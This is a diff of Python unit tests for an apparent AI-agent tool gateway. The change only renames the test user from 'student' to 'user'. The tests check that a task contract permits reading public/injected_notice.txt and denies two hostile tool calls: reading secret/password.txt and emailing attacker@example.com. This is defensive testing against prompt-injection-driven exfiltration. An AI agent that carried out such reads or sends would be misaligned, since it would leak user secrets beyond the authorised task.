@@ -18,12 +18,12 @@ class TestGatewayTaskContract(unittest.TestCase):
 
     def test_allow_read_authorized_file(self):
         contract = build_task_contract(
-            user="student",
+            user="user",
             task_text="读取 public/injected_notice.txt 并发给 teacher@sdu.edu.cn"
         )
 
         request = ToolCallRequest(
-            user="student",
+            user="user",
             tool="file.read",
             params={
                 "path": "public/injected_notice.txt"
@@ -38,12 +38,12 @@ class TestGatewayTaskContract(unittest.TestCase):
 
     def test_deny_read_secret_file(self):
         contract = build_task_contract(
-            user="student",
+            user="user",
             task_text="读取 public/injected_notice.txt 并发给 teacher@sdu.edu.cn"
         )
 
         request = ToolCallRequest(
-            user="student",
+            user="user",
             tool="file.read",
             params={
                 "path": "secret/password.txt"
@@ -58,12 +58,12 @@ class TestGatewayTaskContract(unittest.TestCase):
 
     def test_deny_send_to_unauthorized_email(self):
         contract = build_task_contract(
-            user="student",
+            user="user",
             task_text="读取 public/injected_notice.txt 并发给 teacher@sdu.edu.cn"
         )
 
         request = ToolCallRequest(
-            user="student",
+            user="user",
             tool="email.send",
             params={
                 "to": "attacker@example.com",
@@ -104,4 +104,3 @@ class TestGatewayTaskContract(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
-    
